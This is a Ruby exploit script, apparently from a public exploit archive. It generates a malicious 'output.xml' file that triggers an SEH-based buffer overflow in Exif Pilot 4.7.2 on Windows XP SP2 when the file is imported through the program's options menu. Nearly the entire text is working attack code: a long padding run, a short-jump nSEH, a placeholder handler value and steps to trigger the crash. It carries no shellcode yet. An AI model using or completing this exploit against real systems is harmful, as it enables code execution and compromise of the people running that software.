#!/usr/bin/env ruby
# Exploit Title: Exif Pilot SEH Based Buffer Overflow
# Version: version 4.7.2
# Download: http://www.colorpilot.com/load/exif.exe
# Tested on: Windows XP sp2
# Exploit Author: Osanda M. Jayathissa
# E-Mail: osanda[cat]unseen.is
 
=begin
Click Tools > Options > Customize 35mm tab > Import > and choose 
"output.xml".
The p/p/r addresses contains null characters.
=end
require 'rex'
 
def generate_content(padding1_len, padding2_len)
  header = "\xff\xfe"
  header << Rex::Text.to_unicode("<?xml version=\"1.0\" 
encoding=\"UTF-16\" ?>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("<efls>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("     <eflitem>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("          <maker>");
  header << Rex::Text.to_unicode("");
 
  for i in 0..padding1_len
    header << Rex::Text.to_unicode("A");
  end
 
  header << "\xeb\x00\x06\x00\x90\x00\x90\x00" #nSEH
  header << Rex::Text.to_unicode("CCCC"); #SEH
 
  for i in 0..padding2_len
    header << Rex::Text.to_unicode("A");
  end
 
  header << "\x0d\x00\x0a\x00\x09\x00\x09\x00"
  header << Rex::Text.to_unicode("  </maker>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("          <model>abc</model>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("          <factor>0.000000</factor>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("    </eflitem>")
  header << "\x0d\x00\x0a\x00"
  header << Rex::Text.to_unicode("</efls>")
  header << "\x0d\x00\x0a\x00"
  return header
end
 
##
# main
##
 
filename = 'output.xml'
output_handle = File.new(filename, 'wb')
if !output_handle
  $stdout.puts "Cannot open the file #{filename} for writing!"
  exit -1
end
 
header = generate_content(1619, 7000)
 
$stdout.puts "Generating file #{filename}"
output_handle.puts   header
output_handle.close
 
$stdout.puts "Done!"
exit 0
#EOF






